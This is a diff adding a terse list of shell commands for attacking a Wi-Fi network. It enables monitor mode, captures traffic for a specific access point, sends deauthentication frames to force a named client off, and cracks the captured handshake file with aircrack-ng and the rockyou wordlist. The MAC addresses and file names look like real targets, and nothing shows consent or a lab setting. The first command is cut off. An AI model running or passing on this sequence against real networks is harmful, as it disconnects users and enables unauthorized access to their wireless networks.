@@ -1,0 +1,11 @@
+udo service NetworkManager start  
+sudo aireplay-ng --deauth 15 -a A8:DA:0C:E4:AD:09  -c 7C:A4:49:80:98:39 wlan1
+sudo airodump-ng --bssid 8C:A3:99:C1:5C:9D  --channel 1 --write adarshseva wlan1
+sudo airodump-ng wlan1
+sudo ifconfig wlan1 down
+sudo iwconfig wlan1 mode monitor
+sudo ifconfig wlan1 up
+OR INSTEAD OF ABOVE THREE CMDS;
+sudo airmon-ng start wlan1
+aircrack-ng Amitesh-02.cap -w /usr/share/wordlists/rockyou.txt
+
